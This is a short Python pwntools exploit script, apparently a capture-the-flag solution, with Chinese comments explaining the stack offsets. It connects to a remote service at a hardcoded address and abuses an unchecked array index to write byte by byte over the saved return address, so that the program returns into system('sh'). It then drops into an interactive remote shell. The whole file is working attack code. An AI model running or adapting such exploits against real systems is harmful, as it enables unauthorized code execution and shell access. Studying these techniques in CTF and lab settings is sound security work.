# coding:utf-8
from pwn import *
leave_offset = 0x84#这里实际的main函数的栈大小是0xB8，而ida静态分析出来只有0xA8。还要0x10个空间应该位于ebp附近
def write_addr(addr, va):
    io.sendlineafter("5. exit\n",'3')
    io.sendlineafter("which number to change:\n",str(addr))
    io.sendlineafter("new number:\n",str(va))

io = remote('111.198.29.45', '44219')
io.recv()
io.sendlineafter("How many numbers you have",'1')
io.sendlineafter("Give me your numbers\n",'1')
# system_addr:0x08048450,这里是在plt表上的位置
write_addr(leave_offset, 0X50)#重点在这里修改地址的时候要低地址在前
write_addr(leave_offset + 1, 0X84)#由于前面是char型的数组，所以一个字节一个字节的写。
write_addr(leave_offset + 2, 0X04)
write_addr(leave_offset + 3, 0X08)
# sh_addr  0x08048987
leave_offset += 8#+8是因为返还地址四个字节+在隔四个字节的位置才去读取system函数的参数
write_addr(leave_offset, 0x87)#这里的87是打开ida的Data功能查到的sh字符传进去
write_addr(leave_offset + 1, 0X89)
write_addr(leave_offset + 2, 0X04)
write_addr(leave_offset + 3, 0X08)
io.sendline("5")
io.interactive()
